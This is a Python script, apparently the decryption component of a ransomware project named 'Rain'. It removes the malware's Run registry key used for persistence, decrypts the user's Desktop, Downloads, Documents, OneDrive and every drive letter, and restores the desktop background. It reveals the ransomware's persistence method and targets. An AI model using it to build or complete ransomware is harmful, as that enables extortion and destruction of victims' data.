#!/usr/bin/env python
# Rain file to decrypt machine
# Developed by WillRazorFace

from Decrypter import Decrypt
from os.path import expanduser
from os import chdir, getenv, remove
from string import ascii_uppercase

""" ABOUT VARIABLES TO BE DECLARED

    drives : list of possible drives in Windows
    img : image to be placed on the user's desktop
    decrypto : created instance of the Decrypt class
    desktop : path to the user's desktop (if there is)
    documents : path to the user documents (if there is)
    downloads : path to the user downloads (if there is)
    onedrive : path to the user onedrive (if there is)
    appdata : path to the user's AppData
"""

drives = []

for letter in list(ascii_uppercase):
    letter = letter + ':'
    drives.append(letter)

# Instantiate the Derypt class

decrypto = Decrypt()

desktop = expanduser('~/Desktop')
downloads = expanduser('~/Downloads')
documents = expanduser('~/Documents')
onedrive = expanduser('~/OneDrive')
appdata = getenv('APPDATA')

# Removes Run's registry created to start Rain at system boot

decrypto.delete_registry(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Rain')

# Decrypt user's desktop, documents, downloads, onedrive and restore the desktop background

decrypto.decrypt_directory(desktop)
decrypto.decrypt_directory(downloads)
decrypto.decrypt_directory(documents)
decrypto.decrypt_directory(onedrive)

decrypto.restore_background(appdata)

""" This structure is for decrypting each storage device connected to the machine 
    (USB sticks, external hard drives and hard drives (external or not) )
"""

for drive in drives:
    try:
        chdir(drive + '/')
        decrypto.decrypt_directory(drive)
    except FileNotFoundError:
        continue
    except PermissionError:
        continue
